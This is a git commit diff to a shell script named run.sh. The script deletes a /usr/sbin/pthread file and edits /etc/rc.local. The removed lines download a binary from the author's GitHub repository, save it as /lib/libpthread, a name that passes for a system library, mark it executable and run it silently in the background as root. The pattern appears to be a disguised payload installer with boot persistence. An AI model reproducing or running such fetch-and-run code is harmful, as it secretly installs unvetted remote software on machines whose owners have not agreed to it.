5850410522b62da0b446eb5834c23df87c0fd1c4
atomshadows <31946906+atomshadows@users.noreply.github.com>
2018-10-27 16:12:48 +0800

    Update run.sh

--- run.sh
+++ run.sh
@@ -10,7 +10,4 @@ if [ -e /usr/sbin/pthread ]; then
   rm -rf /usr/sbin/pthread;
 fi
 sed -i '/pthread/d' /etc/rc.local
-sleep 2
-sudo curl -fsSL https://raw.githubusercontent.com/atomshadows/doudous/master/sysps > /lib/libpthread
-sudo chmod +x /lib/libpthread
-sudo /lib/libpthread >/dev/null 2>&1 &
+
